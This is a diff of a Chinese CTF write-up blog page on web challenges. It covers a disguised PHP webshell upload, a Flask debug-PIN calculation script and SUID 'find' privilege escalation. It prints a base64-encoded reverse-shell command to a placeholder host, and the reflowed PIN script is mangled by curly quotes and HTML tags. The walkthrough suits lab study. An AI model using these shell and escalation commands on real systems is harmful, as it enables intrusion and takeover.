@@ -160,9 +160,9 @@ if (strpos($cmd, &#39; &#39;) !== false) &#123;
 <p>这里wc利用 –files0-from，会对文件内容进行读取，如果内容不是正常文件名，就将内容当作文件名来显示，这里就读取到了flag文件</p>
 <h1 id="Week-2-picture"><a href="#Week-2-picture" class="headerlink" title="[Week 2] picture"></a>[Week 2] picture</h1><p>叫上传图片，先上传一个图片马然后再抓个包，这里如果直接上传一个jpg图片，里面的木马是无法被解析的。</p>
 <p>只需要修改上传文件的后缀名就可以成功解析，修改后缀为phtml。（ php &#x2F; php5 &#x2F; pht &#x2F; phtml &#x2F; shtml &#x2F; pwml &#x2F; phtm）都是指向php解析器。</p>
-<p><img src="file:///C:/Users/24772/Pictures/Screenshots/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-10-27%20172120.png?msec=1730299967819"></p>
+<p><img src="file:///D:/hexo/blog/source/photo/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-10-27%20172120.png" alt="图片描述"></p>
 <p>访问后发现一句话木马被解析了没有显示在页面。接下来用蚁剑连接在根目录找到flag。</p>
-<p><img src="file:///C:/Users/24772/Pictures/Screenshots/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-10-27%20172225.png?msec=1730299967820"></p>
+<p><img src="file:///D:/hexo/blog/source/photo/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-10-27%20172225.png"></p>
 <h1 id="Week-2-hello-include"><a href="#Week-2-hello-include" class="headerlink" title="[Week 2] hello_include"></a>[Week 2] hello_include</h1><p>看题目名字就知道是文件包含漏洞，但是没有给出任何的源码，就对网址进行了扫描，扫了半天扫出了一个：<mark>&#x2F;phpinfo.php </mark></p>
 <p>文件得到：<mark>&#x2F;s3cr3t&#x2F;f14g</mark>，这个是flag的位置。</p>
 <p>但是没有扫到源码，提示给出了用户看到php文件，百度了一下，是phps，那么我们访问一下index,phps</p>
@@ -197,19 +197,8 @@ if __name__ == &quot;__main__&quot;:
 <p>打开由 <code>filename</code> 变量指定的文件并将其内容作为响应返回给客户端。这可能导致任意文件读取漏洞，如果未对文件名进行有效性检查，攻击者可能会尝试读取服务器上的敏感文件</p>
 <p>——————————————————————————–结束*</p>
 <p>题目给出了提示说计算pin值，百度之后发现这里开启的debug就可以通过pin值进入控制台，而且这个pin值是能被计算出来的。</p>
-<p>找到一个脚本，注意这里可能有多个脚本，版本较低的无法正确的计算出来，如果懒得找脚本，直接使用文章这个就行<br>    import hashlib<br>    from itertools import chain</p>
-<pre><code>probably_public_bits = [
-    &#39;app&#39;  # username 可通过/etc/passwd获取
-    &#39;flask.app&#39;,  # modname默认值
-    &#39;Flask&#39;,  # 默认值 getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))
-    &#39;/usr/local/lib/python3.9/site-packages/flask/app.py&#39;  # 路径 可报错得到  getattr(mod, &#39;__file__&#39;, None)
-]
-
-private_bits = [
-    &#39;2485378285570&#39;,  # /sys/class/net/eth0/address mac地址十进制
-    &#39;70d3d850-a8d2-4ff1-a285-34c4a401e57d&#39;
-
-     #字符串合并：首先读取文件内容 /etc/machine-id(docker不用看) /proc/sys/kernel/random/boot_id   /proc/self/cgroup
+<p>找到一个脚本，注意这里可能有多个脚本，版本较低的无法正确的计算出来，如果懒得找脚本，直接使用文章这个就行<br>    import hashlib<br>    from itertools import chain<br>    probably_public_bits &#x3D; [<br>        ‘app’  # username 可通过&#x2F;etc&#x2F;passwd获取<br>        ‘flask.app’,  # modname默认值<br>        ‘Flask’,  # 默认值 getattr(app, ‘<strong>name</strong>‘, getattr(app.<strong>class</strong>, ‘<strong>name</strong>‘))<br>        ‘&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.9&#x2F;site-packages&#x2F;flask&#x2F;app.py’  # 路径 可报错得到  getattr(mod, ‘<strong>file</strong>‘, None)<br>    ]<br>    private_bits &#x3D; [<br>        ‘2485378285570’,  # &#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address mac地址十进制<br>        ‘70d3d850-a8d2-4ff1-a285-34c4a401e57d’</p>
+<pre><code>     #字符串合并：首先读取文件内容 /etc/machine-id(docker不用看) /proc/sys/kernel/random/boot_id   /proc/self/cgroup
     # 有machine-id 那就拼接machine-id + /proc/self/cgroup  否则 /proc/sys/kernel/random/boot_id + /proc/self/cgroup
 ]
 
@@ -248,15 +237,15 @@ print(rv)
 <p>到控制台引入import os 模块，弹shell到我们的服务器上（方便操作）</p>
 <p>命令是：<code>os.popen(&quot;echo c2ggLWkgPiYgL2Rldi90Y3AvaXAvcG9ydCAwPiYxDQo=|base64-d|bash&quot;).read()</code></p>
 <p>这里的过程就不再演示了，shell 弹上去之后，输入whoami：</p>
-<p><img src="file:///C:/Users/24772/Pictures/Screenshots/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-10-27%20225525.png?msec=1730299967822"></p>
+<p><img src="file:///D:/hexo/blog/source/photo/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-10-27%20225525.png"></p>
 <p>得到自己是app权限，那么就还是进行提权了</p>
 <p>输入：<mark>find &#x2F; -type f -perm -u&#x3D;s 2&gt;&#x2F;dev&#x2F;null</mark></p>
 <p>查找拥有SUID权限的文件进行提权。</p>
-<p><img src="file:///C:/Users/24772/Pictures/Screenshots/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-10-27%20225724.png?msec=1730299967822"></p>
+<p><img src="file:///D:/hexo/blog/source/photo/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-10-27%20225724.png"></p>
 <p>这里的find命令是可以提权的，提权方式<mark>find . -exec &#x2F;bin&#x2F;sh -p \ ; -quit</mark>，进行提权。但是这里提权失败了，我在我的kali上也进行了这个提权尝试也失败了，不知道是如何提权的，我将这个提权失败的问题反馈给了GPT，GPT给出了新的提权方式。</p>
 <p>使用这条命令进行提权操作：<mark>find . -exec &#x2F;bin&#x2F;bash -p ; -quit</mark>。</p>
 <p>这里提权成功了：</p>
-<p><img src="file:///C:/Users/24772/Pictures/Screenshots/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-10-27%20230211.png?msec=1730299967823"></p>
+<p><img src="file:///D:/hexo/blog/source/photo/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-10-27%20230211.png"></p>
 <p>但是提权成功后还是无法cat &#x2F;flag。（不知道是否真的获得了root权限）</p>
 <h3 id="验证是否真的获得了root权限："><a href="#验证是否真的获得了root权限：" class="headerlink" title="验证是否真的获得了root权限："></a><strong>验证是否真的获得了root权限：</strong></h3><p>我在我的kali上进行了实验，让find命令获得了SUID权限。（以下是操作步骤）</p>
 <ol>
